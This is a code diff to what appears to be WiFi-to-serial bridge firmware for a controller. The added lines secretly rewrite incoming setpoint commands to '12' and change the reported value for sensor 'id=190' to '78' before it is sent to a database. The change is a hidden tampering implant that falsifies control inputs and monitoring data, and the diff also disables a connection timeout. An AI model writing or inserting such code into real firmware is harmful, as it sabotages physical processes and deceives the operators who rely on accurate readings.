@@ -26,6 +26,17 @@ void loop()
     clientStr += ch;
     if(ch == '\n')
     {
+      if(clientStr.startsWith("<setp")) //intercept setpoint
+      {
+        int bracket = clientStr.indexOf('>');
+        int comma = clientStr.indexOf(',');
+        if(comma == bracket + 3)
+        {
+          clientStr[bracket + 1] = '1';
+          clientStr[bracket + 2] = '2';
+        }
+      }
+      
       Serial.print(clientStr);
       clientStr = "";
     }
@@ -41,6 +52,15 @@ void loop()
     {
       if(ch == '\n')
       {
+        if(incoming.indexOf("id=190") > 0) //alter data sent to DB
+        {
+          int valStr = incoming.indexOf("value=");
+          if(valStr > 0) 
+          {
+            incoming[valStr + 6] = '7';
+            incoming[valStr + 7] = '8';
+          }
+        }
         client.print(incoming);
         incoming = "";
       }
@@ -48,7 +68,7 @@ void loop()
       {
         //requestSent = true;
         sendMode = false;
-        incoming = "";    
+        incoming = "";
       }
     }
 
@@ -125,12 +145,12 @@ void loop()
   
         WiFi.begin(ssidArray, passwordArray);
 
-        uint32_t lastCheck = millis();
-        while(millis() - lastCheck < 5000ul)  //5 second timeout 
-        {
-          if(WiFi.status() == WL_CONNECTED) break;
-          delay(100);
-        }
+//        uint32_t lastCheck = millis();
+//        while(millis() - lastCheck < 5000ul)  //5 second timeout 
+//        {
+//          if(WiFi.status() == WL_CONNECTED) break;
+//          delay(100);
+//        }
 
         if(WiFi.status() == WL_CONNECTED) 
         {
